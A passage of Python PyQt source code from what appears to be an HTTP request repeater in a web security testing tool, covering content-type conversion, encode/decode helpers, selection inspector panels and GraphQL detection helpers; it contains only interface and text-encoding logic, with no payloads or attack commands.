            ) if kv else ""

        elif target_ct == "multipart/form-data":
            boundary = "----FormBoundary" + base64.b64encode(b"huntrepeater").decode()[:16]
            new_ct_header = f"multipart/form-data; boundary={boundary}"
            parts_lines = []
            for k, v in kv.items():
                parts_lines.append(f"--{boundary}")
                parts_lines.append(f'Content-Disposition: form-data; name="{k}"')
                parts_lines.append("")
                parts_lines.append(str(v))
            parts_lines.append(f"--{boundary}--")
            new_body = sep.join(parts_lines)

        elif target_ct == "application/xml":
            xml_lines = ["<?xml version=\"1.0\" encoding=\"UTF-8\"?>", "<root>"]
            for k, v in kv.items():
                safe_key = re.sub(r'[^a-zA-Z0-9_\-]', '_', str(k))
                xml_lines.append(f"  <{safe_key}>{html.escape(str(v))}</{safe_key}>")
            xml_lines.append("</root>")
            new_body = sep.join(xml_lines)

        else:  # text/plain
            new_body = sep.join(f"{k}={v}" for k, v in kv.items()) if kv else body

        # ── Update Content-Type header ─────────────────────────────────────────
        header_lines = header_part.splitlines()
        ct_replaced = False
        for i, line in enumerate(header_lines):
            if line.lower().startswith("content-type:"):
                header_lines[i] = f"Content-Type: {new_ct_header}"
                ct_replaced = True
                break
        if not ct_replaced:
            # Insert after the first (request) line
            insert_pos = 1
            header_lines.insert(insert_pos, f"Content-Type: {new_ct_header}")

        new_header_part = sep.join(header_lines)
        new_raw = new_header_part + sep + sep + new_body
        self.request_editor.setPlainText(new_raw)
        self.status_bar.setText(f"⇄  Converted to {new_ct_header}")
        QTimer.singleShot(3000, lambda: self.status_bar.setText("Ready"))

    def _url_encode_selection(self):
        cursor = self.request_editor.textCursor()
        if not cursor.hasSelection():
            return
        text = cursor.selectedText()
        encoded = urllib.parse.quote(text, safe='')
        cursor.insertText(encoded)

    def _url_decode_selection(self):
        cursor = self.request_editor.textCursor()
        if not cursor.hasSelection():
            return
        text = cursor.selectedText()
        decoded = urllib.parse.unquote(text)
        cursor.insertText(decoded)

    def _base64_encode_selection(self):
        cursor = self.request_editor.textCursor()
        if not cursor.hasSelection():
            return
        text = cursor.selectedText()
        try:
            encoded = base64.b64encode(text.encode('utf-8')).decode('utf-8')
            cursor.insertText(encoded)
        except Exception:
            pass

    def _base64_decode_selection(self):
        cursor = self.request_editor.textCursor()
        if not cursor.hasSelection():
            return
        text = cursor.selectedText()
        try:
            # Handle padding if missing
            missing_padding = len(text) % 4
            if missing_padding:
                text += '=' * (4 - missing_padding)
            decoded = base64.b64decode(text).decode('utf-8')
            cursor.insertText(decoded)
        except Exception:
            pass

    def _html_encode_selection(self):
        cursor = self.request_editor.textCursor()
        if not cursor.hasSelection():
            return
        text = cursor.selectedText()
        encoded = html.escape(text)
        cursor.insertText(encoded)

    def _html_decode_selection(self):
        cursor = self.request_editor.textCursor()
        if not cursor.hasSelection():
            return
        text = cursor.selectedText()
        decoded = html.unescape(text)
        cursor.insertText(decoded)

    def _hex_encode_selection(self):
        cursor = self.request_editor.textCursor()
        if not cursor.hasSelection():
            return
        text = cursor.selectedText()
        try:
            encoded = text.encode('utf-8').hex()
            cursor.insertText(encoded)
        except Exception:
            pass

    def _hex_decode_selection(self):
        cursor = self.request_editor.textCursor()
        if not cursor.hasSelection():
            return
        text = cursor.selectedText()
        try:
            clean_text = text.replace(" ", "")
            decoded = bytes.fromhex(clean_text).decode('utf-8', errors='replace')
            cursor.insertText(decoded)
        except Exception:
            pass

    # ── Selection Inspector ───────────────────────────────────────────────────

    def _build_req_sel_inspector_panel(self) -> QFrame:
        """Inspector panel for REQUEST text selection — card-based."""
        self._rsel_current_text: str = ""
        self._rsel_detected_encoding: str = ""
        self._rsel_decoded_original: str = ""

        panel = QFrame()
        panel.setSizePolicy(QSizePolicy.Expanding, QSizePolicy.Expanding)
        panel.setStyleSheet(
            f"QFrame{{ background:{COLOR_CARD_BG}; border:none; "
            f"border-bottom:2px solid {COLOR_ACCENT}; }}"
        )
        layout = QVBoxLayout(panel)
        layout.setContentsMargins(0, 0, 0, 0)
        layout.setSpacing(0)

        # Title bar
        title_bar = QFrame()
        title_bar.setFixedHeight(26)
        title_bar.setStyleSheet(
            f"background:{COLOR_ELEVATED_BG};border-bottom:1px solid {COLOR_BORDER};"
        )
        tb = QHBoxLayout(title_bar)
        tb.setContentsMargins(8, 2, 6, 2)
        tb.setSpacing(6)

        title_lbl = QLabel("\U0001f52c Request Selection Inspector")
        title_lbl.setStyleSheet(
            f"color:{COLOR_ACCENT};font-weight:700;font-size:11px;background:transparent;"
        )
        tb.addWidget(title_lbl)

        self._rsel_badge = QLabel("")
        self._rsel_badge.setStyleSheet(
            f"color:{COLOR_TEXT_MUTED};font-size:10px;background:transparent;"
        )
        tb.addWidget(self._rsel_badge)
        tb.addStretch()

        for label, tooltip, slot, accent in [
            ("\U0001f4cb Copy", "Copy raw selected text",
             lambda: QApplication.clipboard().setText(self._rsel_current_text), False),
            ("\U0001f510 Decoder", "Send to Decoder tab",
             lambda: self._send_repeater_sel_to_decoder("request"), True),
        ]:
            btn = QPushButton(label)
            btn.setFixedHeight(19)
            btn.setToolTip(tooltip)
            btn.setStyleSheet(
                f"background:{COLOR_ELEVATED_BG};"
                f"color:{COLOR_ACCENT if accent else COLOR_TEXT};"
                f"border:1px solid {COLOR_BORDER};border-radius:3px;"
                f"font-size:10px;padding:0 6px;"
            )
            btn.clicked.connect(slot)
            tb.addWidget(btn)

        close_btn = QPushButton("\u2715")
        close_btn.setFixedSize(19, 19)
        close_btn.setStyleSheet(
            f"background:{COLOR_ELEVATED_BG};color:{COLOR_TEXT_MUTED};"
            f"border:1px solid {COLOR_BORDER};border-radius:3px;font-size:10px;"
        )
        close_btn.clicked.connect(self._on_close_req_sel_panel)
        tb.addWidget(close_btn)
        layout.addWidget(title_bar)

        # Empty-state placeholder
        self._rsel_empty_lbl = QLabel("Select text in the request\nto inspect it here")
        self._rsel_empty_lbl.setAlignment(Qt.AlignCenter)
        self._rsel_empty_lbl.setStyleSheet(
            f"color:{COLOR_TEXT_MUTED};font-size:11px;background:{COLOR_DARK_BG};"
            f"padding:20px;"
        )
        layout.addWidget(self._rsel_empty_lbl, 1)

        # Card scroll area (hidden until there is a selection)
        self._rsel_card_scroll = QScrollArea()
        self._rsel_card_scroll.setWidgetResizable(True)
        self._rsel_card_scroll.setFrameShape(QFrame.NoFrame)
        self._rsel_card_scroll.setHorizontalScrollBarPolicy(Qt.ScrollBarAlwaysOff)
        self._rsel_card_scroll.setStyleSheet(
            f"QScrollArea {{background:{COLOR_DARK_BG};border:none;}}"
            f"QScrollBar:vertical {{background:#1a1a2a;width:8px;border-radius:4px;}}"
            f"QScrollBar::handle:vertical {{background:#3a3a5a;border-radius:4px;}}"
        )
        _rsel_container = QWidget()
        _rsel_container.setStyleSheet(f"background:{COLOR_DARK_BG};")
        self._rsel_card_layout = QVBoxLayout(_rsel_container)
        self._rsel_card_layout.setContentsMargins(6, 6, 6, 6)
        self._rsel_card_layout.setSpacing(6)
        self._rsel_card_layout.addStretch()
        self._rsel_card_scroll.setWidget(_rsel_container)
        self._rsel_card_scroll.setVisible(False)
        layout.addWidget(self._rsel_card_scroll, 1)

        # ── Edit Decoded card (persistent, shown only when encoding detected) ──
        _reenc_body = QWidget()
        _reenc_body.setStyleSheet("background:transparent;")
        _reenc_bl = QVBoxLayout(_reenc_body)
        _reenc_bl.setContentsMargins(0, 0, 0, 0)
        _reenc_bl.setSpacing(4)

        self._rsel_reenc_edit = QTextEdit()
        self._rsel_reenc_edit.setFixedHeight(58)
        self._rsel_reenc_edit.setStyleSheet(
            f"background:{COLOR_DARK_BG};color:{COLOR_TEXT_BRIGHT};"
            f"border:1px solid {COLOR_BORDER};border-radius:3px;"
            f"font-family:{FONT_FAMILY_MONO};font-size:11px;padding:3px;"
        )
        _reenc_bl.addWidget(self._rsel_reenc_edit)

        _reenc_btn_row = QHBoxLayout()
        _reenc_btn_row.addStretch()
        _reset_btn = QPushButton("\u21a9 Reset")
        _reset_btn.setFixedHeight(20)
        _reset_btn.setStyleSheet(
            f"background:{COLOR_ELEVATED_BG};color:{COLOR_TEXT_MUTED};"
            f"border:1px solid {COLOR_BORDER};border-radius:3px;font-size:10px;padding:0 7px;"
        )
        _reset_btn.setToolTip("Restore original decoded value")
        _reset_btn.clicked.connect(self._reset_req_reenc_edit)
        _apply_btn = QPushButton("\u2714 Apply & Re-encode")
        _apply_btn.setFixedHeight(20)
        _apply_btn.setStyleSheet(
            f"background:{COLOR_SUCCESS};color:#000;border:none;"
            f"border-radius:3px;font-weight:700;font-size:10px;padding:0 9px;"
        )
        _apply_btn.setToolTip("Re-encode and replace selection in request editor")
        _apply_btn.clicked.connect(self._apply_req_reencoded)
        _reenc_btn_row.addWidget(_reset_btn)
        _reenc_btn_row.addWidget(_apply_btn)
        _reenc_bl.addLayout(_reenc_btn_row)

        self._rsel_reenc_card = _InspectorCard(
            "\u270f  Edit Decoded", COLOR_ACCENT,
            body_widget=_reenc_body
        )
        self._rsel_reenc_card.setVisible(False)
        layout.addWidget(self._rsel_reenc_card)
        return panel

    def _build_resp_sel_inspector_panel(self) -> QFrame:
        """Inspector panel for RESPONSE text selection — card-based."""
        self._respsel_current_text: str = ""
        self._respsel_detected_encoding: str = ""
        self._respsel_decoded_original: str = ""

        panel = QFrame()
        panel.setSizePolicy(QSizePolicy.Expanding, QSizePolicy.Expanding)
        panel.setStyleSheet(
            f"QFrame{{ background:{COLOR_CARD_BG}; border:none; "
            f"border-bottom:2px solid {COLOR_SUCCESS}; }}"
        )
        layout = QVBoxLayout(panel)
        layout.setContentsMargins(0, 0, 0, 0)
        layout.setSpacing(0)

        # Title bar
        title_bar = QFrame()
        title_bar.setFixedHeight(26)
        title_bar.setStyleSheet(
            f"background:{COLOR_ELEVATED_BG};border-bottom:1px solid {COLOR_BORDER};"
        )
        tb = QHBoxLayout(title_bar)
        tb.setContentsMargins(8, 2, 6, 2)
        tb.setSpacing(6)

        title_lbl = QLabel(" Response Selection Inspector")
        title_lbl.setStyleSheet(
            f"color:{COLOR_SUCCESS};font-weight:700;font-size:11px;background:transparent;"
        )
        tb.addWidget(title_lbl)

        self._respsel_badge = QLabel("")
        self._respsel_badge.setStyleSheet(
            f"color:{COLOR_TEXT_MUTED};font-size:10px;background:transparent;"
        )
        tb.addWidget(self._respsel_badge)
        tb.addStretch()

        for label, tooltip, slot, accent in [
            (" Copy", "Copy raw selected text",
             lambda: QApplication.clipboard().setText(self._respsel_current_text), False),
            (" Decoder", "Send to Decoder tab",
             lambda: self._send_repeater_sel_to_decoder("response"), True),
        ]:
            btn = QPushButton(label)
            btn.setFixedHeight(19)
            btn.setToolTip(tooltip)
            btn.setStyleSheet(
                f"background:{COLOR_ELEVATED_BG};"
                f"color:{COLOR_ACCENT if accent else COLOR_TEXT};"
                f"border:1px solid {COLOR_BORDER};border-radius:3px;"
                f"font-size:10px;padding:0 6px;"
            )
            btn.clicked.connect(slot)
            tb.addWidget(btn)

        close_btn = QPushButton("\u2715")
        close_btn.setFixedSize(19, 19)
        close_btn.setStyleSheet(
            f"background:{COLOR_ELEVATED_BG};color:{COLOR_TEXT_MUTED};"
            f"border:1px solid {COLOR_BORDER};border-radius:3px;font-size:10px;"
        )
        close_btn.clicked.connect(self._on_close_resp_sel_panel)
        tb.addWidget(close_btn)
        layout.addWidget(title_bar)

        # Empty-state placeholder
        self._respsel_empty_lbl = QLabel("Select text in the response\nto inspect it here")
        self._respsel_empty_lbl.setAlignment(Qt.AlignCenter)
        self._respsel_empty_lbl.setStyleSheet(
            f"color:{COLOR_TEXT_MUTED};font-size:11px;background:{COLOR_DARK_BG};"
            f"padding:20px;"
        )
        layout.addWidget(self._respsel_empty_lbl, 1)

        # Card scroll area
        self._respsel_card_scroll = QScrollArea()
        self._respsel_card_scroll.setWidgetResizable(True)
        self._respsel_card_scroll.setFrameShape(QFrame.NoFrame)
        self._respsel_card_scroll.setHorizontalScrollBarPolicy(Qt.ScrollBarAlwaysOff)
        self._respsel_card_scroll.setStyleSheet(
            f"QScrollArea {{background:{COLOR_DARK_BG};border:none;}}"
            f"QScrollBar:vertical {{background:#1a1a2a;width:8px;border-radius:4px;}}"
            f"QScrollBar::handle:vertical {{background:#3a3a5a;border-radius:4px;}}"
        )
        _respsel_container = QWidget()
        _respsel_container.setStyleSheet(f"background:{COLOR_DARK_BG};")
        self._respsel_card_layout = QVBoxLayout(_respsel_container)
        self._respsel_card_layout.setContentsMargins(6, 6, 6, 6)
        self._respsel_card_layout.setSpacing(6)
        self._respsel_card_layout.addStretch()
        self._respsel_card_scroll.setWidget(_respsel_container)
        self._respsel_card_scroll.setVisible(False)
        layout.addWidget(self._respsel_card_scroll, 1)

        # ── Copy Re-encoded card (response is read-only — copy instead of apply) ──
        _resp_reenc_body = QWidget()
        _resp_reenc_body.setStyleSheet("background:transparent;")
        _resp_reenc_bl = QVBoxLayout(_resp_reenc_body)
        _resp_reenc_bl.setContentsMargins(0, 0, 0, 0)
        _resp_reenc_bl.setSpacing(4)

        self._respsel_reenc_edit = QTextEdit()
        self._respsel_reenc_edit.setFixedHeight(55)
        self._respsel_reenc_edit.setStyleSheet(
            f"background:{COLOR_DARK_BG};color:{COLOR_TEXT_BRIGHT};"
            f"border:1px solid {COLOR_BORDER};border-radius:3px;"
            f"font-family:{FONT_FAMILY_MONO};font-size:11px;padding:3px;"
        )
        _resp_reenc_bl.addWidget(self._respsel_reenc_edit)

        _resp_btn_row = QHBoxLayout()
        _resp_btn_row.addStretch()
        _resp_reset_btn = QPushButton("\u21a9 Reset")
        _resp_reset_btn.setFixedHeight(20)
        _resp_reset_btn.setStyleSheet(
            f"background:{COLOR_ELEVATED_BG};color:{COLOR_TEXT_MUTED};"
            f"border:1px solid {COLOR_BORDER};border-radius:3px;font-size:10px;padding:0 7px;"
        )
        _resp_reset_btn.setToolTip("Restore original decoded value")
        _resp_reset_btn.clicked.connect(self._reset_resp_reenc_edit)
        _copy_reenc_btn = QPushButton("\U0001f4cb Copy Re-encoded")
        _copy_reenc_btn.setFixedHeight(20)
        _copy_reenc_btn.setStyleSheet(
            f"background:{COLOR_SUCCESS};color:#000;border:none;"
            f"border-radius:3px;font-weight:700;font-size:10px;padding:0 9px;"
        )
        _copy_reenc_btn.setToolTip("Re-encode edited value and copy to clipboard")
        _copy_reenc_btn.clicked.connect(self._copy_resp_reencoded)
        _resp_btn_row.addWidget(_resp_reset_btn)
        _resp_btn_row.addWidget(_copy_reenc_btn)
        _resp_reenc_bl.addLayout(_resp_btn_row)

        self._respsel_reenc_card = _InspectorCard(
            "\u270f  Edit Decoded", COLOR_SUCCESS,
            body_widget=_resp_reenc_body
        )
        self._respsel_reenc_card.setVisible(False)
        layout.addWidget(self._respsel_reenc_card)
        return panel

    def _make_req_inline_final_card(self, label: str, color: str, body_html: str):
        body = QWidget()
        body.setStyleSheet("background:transparent;")
        lay = QVBoxLayout(body)
        lay.setContentsMargins(0, 0, 0, 0)
        lay.setSpacing(4)

        self._rsel_reenc_edit = QTextEdit()
        self._rsel_reenc_edit.setVerticalScrollBarPolicy(Qt.ScrollBarAlwaysOff)
        self._rsel_reenc_edit.setHorizontalScrollBarPolicy(Qt.ScrollBarAlwaysOff)
        self._rsel_reenc_edit.setStyleSheet(
            f"background:{COLOR_DARK_BG};color:{COLOR_TEXT_BRIGHT};"
            f"border:1px solid {COLOR_BORDER};border-radius:3px;"
            f"font-family:{FONT_FAMILY_MONO};font-size:11px;padding:4px;"
        )
        self._rsel_reenc_edit.setHtml(body_html)
        self._rsel_reenc_edit.textChanged.connect(
            lambda: self._fit_inline_edit_height(self._rsel_reenc_edit)
        )
        QTimer.singleShot(0, lambda: self._fit_inline_edit_height(self._rsel_reenc_edit))
        lay.addWidget(self._rsel_reenc_edit)

        row = QHBoxLayout()
        row.addStretch()
        reset_btn = QPushButton("\u21a9 Reset")
        reset_btn.setFixedHeight(20)
        reset_btn.setStyleSheet(
            f"background:{COLOR_ELEVATED_BG};color:{COLOR_TEXT_MUTED};"
            f"border:1px solid {COLOR_BORDER};border-radius:3px;font-size:10px;padding:0 7px;"
        )
        reset_btn.clicked.connect(self._reset_req_reenc_edit)
        apply_btn = QPushButton("\u2714 Apply & Re-encode")
        apply_btn.setFixedHeight(20)
        apply_btn.setStyleSheet(
            f"background:{COLOR_SUCCESS};color:#000;border:none;"
            f"border-radius:3px;font-weight:700;font-size:10px;padding:0 9px;"
        )
        apply_btn.clicked.connect(self._apply_req_reencoded)
        row.addWidget(reset_btn)
        row.addWidget(apply_btn)
        lay.addLayout(row)

        return _InspectorCard(label, color, body_widget=body)

    def _make_resp_inline_final_card(self, label: str, color: str, body_html: str):
        body = QWidget()
        body.setStyleSheet("background:transparent;")
        lay = QVBoxLayout(body)
        lay.setContentsMargins(0, 0, 0, 0)
        lay.setSpacing(4)

        self._respsel_reenc_edit = QTextEdit()
        self._respsel_reenc_edit.setVerticalScrollBarPolicy(Qt.ScrollBarAlwaysOff)
        self._respsel_reenc_edit.setHorizontalScrollBarPolicy(Qt.ScrollBarAlwaysOff)
        self._respsel_reenc_edit.setStyleSheet(
            f"background:{COLOR_DARK_BG};color:{COLOR_TEXT_BRIGHT};"
            f"border:1px solid {COLOR_BORDER};border-radius:3px;"
            f"font-family:{FONT_FAMILY_MONO};font-size:11px;padding:4px;"
        )
        self._respsel_reenc_edit.setHtml(body_html)
        self._respsel_reenc_edit.textChanged.connect(
            lambda: self._fit_inline_edit_height(self._respsel_reenc_edit)
        )
        QTimer.singleShot(0, lambda: self._fit_inline_edit_height(self._respsel_reenc_edit))
        lay.addWidget(self._respsel_reenc_edit)

        row = QHBoxLayout()
        row.addStretch()
        reset_btn = QPushButton("\u21a9 Reset")
        reset_btn.setFixedHeight(20)
        reset_btn.setStyleSheet(
            f"background:{COLOR_ELEVATED_BG};color:{COLOR_TEXT_MUTED};"
            f"border:1px solid {COLOR_BORDER};border-radius:3px;font-size:10px;padding:0 7px;"
        )
        reset_btn.clicked.connect(self._reset_resp_reenc_edit)
        copy_btn = QPushButton("\U0001f4cb Copy Re-encoded")
        copy_btn.setFixedHeight(20)
        copy_btn.setStyleSheet(
            f"background:{COLOR_SUCCESS};color:#000;border:none;"
            f"border-radius:3px;font-weight:700;font-size:10px;padding:0 9px;"
        )
        copy_btn.clicked.connect(self._copy_resp_reencoded)
        row.addWidget(reset_btn)
        row.addWidget(copy_btn)
        lay.addLayout(row)

        return _InspectorCard(label, color, body_widget=body)

    def _build_rsel_cards(self, card_data: list, encoding: str = "", decoded_val: str = ""):
        """Rebuild the request inspector card scroll area."""
        # Null out the reference BEFORE deleteLater so _fit_inline_edit_height
        # is never called with a C++ object that has already been destroyed.
        self._rsel_reenc_edit = None
        lay = self._rsel_card_layout
        while lay.count() > 0:
            item = lay.takeAt(0)
            if item.widget():
                item.widget().deleteLater()
        self._rsel_reenc_original_html = ""
        for label, color, body, warn, crit, is_html in card_data:
            if encoding and decoded_val is not None and "Final Decoded" in label:
                self._rsel_reenc_original_html = body
                card = self._make_req_inline_final_card(label, color, body)
            else:
                card = _InspectorCard(label, color, body, warn=warn, crit=crit, is_html=is_html)
            lay.addWidget(card)
        lay.addStretch()
        QApplication.processEvents()
        if hasattr(self, '_rsel_reenc_edit') and self._rsel_reenc_edit is not None:
            self._fit_inline_edit_height(self._rsel_reenc_edit)
        self._rsel_card_scroll.verticalScrollBar().setValue(0)

    def _build_respsel_cards(self, card_data: list, encoding: str = "", decoded_val: str = ""):
        """Rebuild the response inspector card scroll area."""
        # Null out the reference BEFORE deleteLater so _fit_inline_edit_height
        # is never called with a C++ object that has already been destroyed.
        self._respsel_reenc_edit = None
        lay = self._respsel_card_layout
        while lay.count() > 0:
            item = lay.takeAt(0)
            if item.widget():
                item.widget().deleteLater()
        self._respsel_reenc_original_html = ""
        for label, color, body, warn, crit, is_html in card_data:
            if encoding and decoded_val is not None and "Final Decoded" in label:
                self._respsel_reenc_original_html = body
                card = self._make_resp_inline_final_card(label, color, body)
            else:
                card = _InspectorCard(label, color, body, warn=warn, crit=crit, is_html=is_html)
            lay.addWidget(card)
        lay.addStretch()
        QApplication.processEvents()
        if hasattr(self, '_respsel_reenc_edit') and self._respsel_reenc_edit is not None:
            self._fit_inline_edit_height(self._respsel_reenc_edit)
        self._respsel_card_scroll.verticalScrollBar().setValue(0)

    def _fit_inline_edit_height(self, edit: QTextEdit, min_h: int = 78, max_h: int = 420):
        """Auto-size inline edit fields to content, avoiding inner scrollbars."""
        if edit is None:
            return
        try:
            doc = edit.document()
            vw = edit.viewport().width()
            if vw <= 0:
                vw = max(edit.width() - 12, 120)
            doc.setTextWidth(max(vw, 60))
            h = int(doc.documentLayout().documentSize().height())
            margin = int(doc.documentMargin())
            target = h + margin * 2 + 12
            edit.setFixedHeight(max(min_h, min(max_h, target)))
        except RuntimeError:
            pass  # Widget was deleted between the check and the call

    def _on_repeater_req_selection_changed(self):
        """Selection changed in the REQUEST editor → update inspector cards."""
        cursor = self.request_editor.textCursor()
        if cursor.hasSelection():
            text = cursor.selectedText().replace('\u2029', '\n').replace('\u2028', '\n')
            if text and len(text.strip()) >= 2:
                self._insp_sel_stack.setCurrentWidget(self._req_sel_panel)
                self._rsel_current_text = text
                self._rsel_badge.setText(
                    f"• {len(text)} chars • {len(text.encode('utf-8'))} bytes"
                )
                self._rsel_pending_text = text
                self._sel_req_timer.start()
                self._rsel_empty_lbl.setVisible(False)
                self._rsel_card_scroll.setVisible(True)
                return
        # No request selection — clear inspector
        self._sel_req_timer.stop()
        self._rsel_pending_text = ""
        self._rsel_current_text = ""
        self._rsel_detected_encoding = ""
        self._rsel_badge.setText("")
        self._rsel_card_scroll.setVisible(False)
        self._rsel_reenc_card.setVisible(False)
        self._rsel_empty_lbl.setVisible(True)

    def _process_repeater_req_selection(self):
        """Run heavy request selection analysis after debounce delay."""
        text = getattr(self, '_rsel_pending_text', '')
        if not text:
            return
        cached = self._rsel_last_analysis
        if cached and cached[0] == text:
            _text, cards, encoding, decoded_val = cached
        else:
            cards, encoding, decoded_val = _analyze_selection_cards(text)
            self._rsel_last_analysis = (text, cards, encoding, decoded_val)
        self._rsel_detected_encoding = encoding
        self._rsel_decoded_original = decoded_val or ""
        self._build_rsel_cards(cards, encoding, decoded_val or "")
        self._rsel_reenc_card.setVisible(False)

    def _on_repeater_resp_selection_changed(self):
        """Selection changed in one of the RESPONSE views → update inspector cards."""
        current = self._get_current_response_editor()
        if not isinstance(current, QPlainTextEdit):
            self._sel_resp_timer.stop()
            self._respsel_pending_text = ""
            self._respsel_current_text = ""
            self._respsel_detected_encoding = ""
            self._respsel_badge.setText("")
            self._respsel_card_scroll.setVisible(False)
            self._respsel_reenc_card.setVisible(False)
            self._respsel_empty_lbl.setVisible(True)
            return
        cursor = current.textCursor()
        if cursor.hasSelection():
            text = cursor.selectedText().replace('\u2029', '\n').replace('\u2028', '\n')
            if text and len(text.strip()) >= 2:
                self._insp_sel_stack.setCurrentWidget(self._resp_sel_panel)
                self._respsel_current_text = text
                self._respsel_badge.setText(
                    f"• {len(text)} chars • {len(text.encode('utf-8'))} bytes"
                )
                self._respsel_pending_text = text
                self._sel_resp_timer.start()
                self._respsel_empty_lbl.setVisible(False)
                self._respsel_card_scroll.setVisible(True)
                return
        # No response selection — clear inspector
        self._sel_resp_timer.stop()
        self._respsel_pending_text = ""
        self._respsel_current_text = ""
        self._respsel_detected_encoding = ""
        self._respsel_badge.setText("")
        self._respsel_card_scroll.setVisible(False)
        self._respsel_reenc_card.setVisible(False)
        self._respsel_empty_lbl.setVisible(True)

    def _process_repeater_resp_selection(self):
        """Run heavy response selection analysis after debounce delay."""
        text = getattr(self, '_respsel_pending_text', '')
        if not text:
            return
        cached = self._respsel_last_analysis
        if cached and cached[0] == text:
            _text, cards, encoding, decoded_val = cached
        else:
            cards, encoding, decoded_val = _analyze_selection_cards(text)
            self._respsel_last_analysis = (text, cards, encoding, decoded_val)
        self._respsel_detected_encoding = encoding
        self._respsel_decoded_original = decoded_val or ""
        self._build_respsel_cards(cards, encoding, decoded_val or "")
        self._respsel_reenc_card.setVisible(False)

    def _toggle_inspector_panel(self):
        """Toggle the inspector sidebar open/closed."""
        self._inspector_is_open = not self._inspector_is_open
        if self._inspector_is_open:
            self._insp_content.setVisible(True)
            self._insp_vert_lbl.setStyleSheet(
                f"color:{COLOR_ACCENT};font-size:11px;font-weight:700;"
                f"background:transparent;letter-spacing:2px;"
            )
            total = (self._main_splitter.width() or
                     sum(self._main_splitter.sizes()) or 1200)
            insp_w = max(200, int(total * 0.30))  # 30% of total width
            rem = max(200, total - insp_w)
            # Allow splitter to give it its full share; remove the cap
            self._inspector_side_frame.setMaximumWidth(16777215)
            self._main_splitter.setSizes([rem // 2, rem - rem // 2, insp_w])
        else:
            self._insp_content.setVisible(False)
            self._insp_vert_lbl.setStyleSheet(
                f"color:{COLOR_TEXT_MUTED};font-size:11px;font-weight:700;"
                f"background:transparent;letter-spacing:2px;"
            )
            total = sum(self._main_splitter.sizes()) or 1200
            rem = max(200, total - 34)
            # Lock to 34px so splitter can't grow it while collapsed
            self._inspector_side_frame.setMaximumWidth(34)
            self._main_splitter.setSizes([rem // 2, rem - rem // 2, 34])

    def _show_inspector_side_panel(self):
        """Open inspector if not already open (called by selection-change logic)."""
        if not self._inspector_is_open:
            self._toggle_inspector_panel()

    def _on_close_req_sel_panel(self):
        """Clear request inspector content and restore empty state."""
        self._rsel_current_text = ""
        self._rsel_detected_encoding = ""
        self._rsel_badge.setText("")
        self._rsel_card_scroll.setVisible(False)
        self._rsel_reenc_card.setVisible(False)
        self._rsel_empty_lbl.setVisible(True)

    def _on_close_resp_sel_panel(self):
        """Clear response inspector content and restore empty state."""
        self._respsel_current_text = ""
        self._respsel_detected_encoding = ""
        self._respsel_badge.setText("")
        self._respsel_card_scroll.setVisible(False)
        self._respsel_reenc_card.setVisible(False)
        self._respsel_empty_lbl.setVisible(True)

    def _apply_req_reencoded(self):
        """Re-encode edited value and replace the selection in the request editor."""
        edited = self._rsel_reenc_edit.toPlainText()
        enc = self._rsel_detected_encoding
        if not enc:
            return
        try:
            reencoded = reencode_decoded_value(edited, enc, self._rsel_current_text)
        except Exception as e:
            QMessageBox.warning(self, "Re-encode Error", f"Could not re-encode: {e}")
            return
        cursor = self.request_editor.textCursor()
        if cursor.hasSelection():
            cursor.insertText(reencoded)
            self.request_editor.setTextCursor(cursor)
            self._on_close_req_sel_panel()
        else:
            QMessageBox.information(
                self, "No Selection",
                "The original selection was lost. Re-select the text and try again."
            )

    def _copy_resp_reencoded(self):
        """Re-encode edited value (response side) and copy to clipboard."""
        edited = self._respsel_reenc_edit.toPlainText()
        enc = self._respsel_detected_encoding
        try:
            result = reencode_decoded_value(edited, enc, self._respsel_current_text)
        except Exception as e:
            QMessageBox.warning(self, "Re-encode Error", f"Could not re-encode: {e}")
            return
        QApplication.clipboard().setText(result)

    def _reset_req_reenc_edit(self):
        """Restore original decoded value in the request re-encode edit box."""
        if hasattr(self, '_rsel_reenc_edit') and self._rsel_reenc_edit is not None:
            html = getattr(self, '_rsel_reenc_original_html', '')
            if html:
                self._rsel_reenc_edit.setHtml(html)
            else:
                self._rsel_reenc_edit.setPlainText(getattr(self, '_rsel_decoded_original', ''))

    def _reset_resp_reenc_edit(self):
        """Restore original decoded value in the response re-encode edit box."""
        if hasattr(self, '_respsel_reenc_edit') and self._respsel_reenc_edit is not None:
            html = getattr(self, '_respsel_reenc_original_html', '')
            if html:
                self._respsel_reenc_edit.setHtml(html)
            else:
                self._respsel_reenc_edit.setPlainText(getattr(self, '_respsel_decoded_original', ''))

    def _send_repeater_sel_to_decoder(self, source: str):
        """Send currently inspected selected text to the Decoder tab."""
        text = (self._rsel_current_text if source == "request"
                else self._respsel_current_text)
        if not text:
            return
        main_win = self.window()
        if hasattr(main_win, 'tab_widget'):
            tw = main_win.tab_widget
            for i in range(tw.count()):
                if 'Decoder' in tw.tabText(i):
                    tw.setCurrentIndex(i)
                    break
        for te in main_win.findChildren(QTextEdit):
            if te.objectName() == 'decoder_input' and not te.isReadOnly():
                te.setPlainText(text)
                te.setFocus()
                break


    # ── GraphQL view helpers ───────────────────────────────────────────────────

    def _extract_url_for_gql(self, raw_request: str) -> str:
        """Return 'host + path' string from the raw request for GQL URL-hint detection."""
        lines = raw_request.splitlines()
        path = ""
        host_hdr = ""
        if lines:
            parts = lines[0].split()
            if len(parts) >= 2:
                path = parts[1]
        for line in lines[1:30]:
            if line.lower().startswith("host:"):
                host_hdr = line[5:].strip()
                break
        return (host_hdr + path) if host_hdr else path

    def _on_req_text_changed_detect(self) -> None:
        """Called 600 ms after the request editor text changes — re-run GQL + JWT detection."""
        if self._gql_req_mode:
            return  # already in GQL view; don't disrupt the user
        raw = self.request_editor.toPlainText()
        if not raw.strip():
            self._reset_gql_view()
            self._update_jwt_state("", self.resp_raw.toPlainText() if hasattr(self, "resp_raw") else "")
            return
        _url = self._extract_url_for_gql(raw)
        self._update_gql_state(_url, raw, self.resp_raw.toPlainText() if hasattr(self, "resp_raw") else "")
        # Don't update JWT if JWT view is active (user might be editing)
        if not self._jwt_req_mode:
            self._update_jwt_state(raw, self.resp_raw.toPlainText() if hasattr(self, "resp_raw") else "")

    def _sync_gql_to_raw(self) -> None:
        """Write the editable GQL panel contents back into the raw request editor."""
        import json
        raw = self.request_editor.toPlainText()
        # Split off header section
        if "\r\n\r\n" in raw:
            header_part, _ = raw.split("\r\n\r\n", 1)
            sep = "\r\n\r\n"
        elif "\n\n" in raw:
            header_part, _ = raw.split("\n\n", 1)
            sep = "\n\n"
        else:
            header_part = raw
            sep = "\n\n"
        query    = self.req_gql_query_text.toPlainText().strip()
        vars_txt = self.req_gql_vars_text.toPlainText().strip()
